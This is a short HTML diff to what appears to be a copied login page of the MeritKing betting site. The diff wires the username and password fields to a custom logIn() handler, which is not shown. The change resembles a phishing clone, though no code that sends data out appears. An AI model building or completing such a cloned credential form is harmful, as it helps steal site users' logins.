@@ -16,7 +16,7 @@
                <li data-v-c70e1c26=""><button data-v-c70e1c26=""><img data-v-c70e1c26="" src="https://d3ejb2l5e3bvmc.cloudfront.net/production/promotions/promotion_142_37_v3.gif" alt="%40 PERŞEMBE BONUSU"></button></li>
             </ul>
          </div>
-         <form data-v-c70e1c26="">
+         <form data-v-c70e1c26="" id="login_form" onsubmit="logIn()" action="javascript:;">
             <div data-v-c70e1c26="" class="login__brand">
                <img data-v-c70e1c26="" src="/assets/images/logo-dark.png" alt="MeritKing"> 
                <h3 data-v-c70e1c26="">UMUT DEĞİL PARA DAĞITIYORUZ!</h3>
@@ -26,7 +26,7 @@
                   <div data-v-192295e2="" class="auth-input__wrapper">
                      <div data-v-192295e2="" class="auth-input__root">
                         <div data-v-192295e2="" class="auth-input__icon"><i data-v-3ee02676="" data-v-192295e2="" class="icon-user icon--md"></i></div>
-                        <input data-v-192295e2="" type="text" placeholder="Kullanıcı Adınız" class="input--reset"> <!---->
+                        <input data-v-192295e2="" type="text" placeholder="Kullanıcı Adınız" name="login" class="input--reset"> <!---->
                      </div>
                   </div>
                   <!---->
@@ -35,7 +35,7 @@
                   <div data-v-192295e2="" class="auth-input__wrapper">
                      <div data-v-192295e2="" class="auth-input__root">
                         <div data-v-192295e2="" class="auth-input__icon"><i data-v-3ee02676="" data-v-192295e2="" class="icon-lock icon--md"></i></div>
-                        <input data-v-192295e2="" type="password" placeholder="Şifreniz" class="input--reset"> <button data-v-192295e2="" type="button" class="auth-input__toggle"><i data-v-3ee02676="" data-v-192295e2="" class="icon-eye-slash icon--sm"></i></button>
+                        <input data-v-192295e2="" name="password" type="password" placeholder="Şifreniz" class="input--reset"> <button data-v-192295e2="" type="button" class="auth-input__toggle"><i data-v-3ee02676="" data-v-192295e2="" class="icon-eye-slash icon--sm"></i></button>
                      </div>
                   </div>
                   <!---->
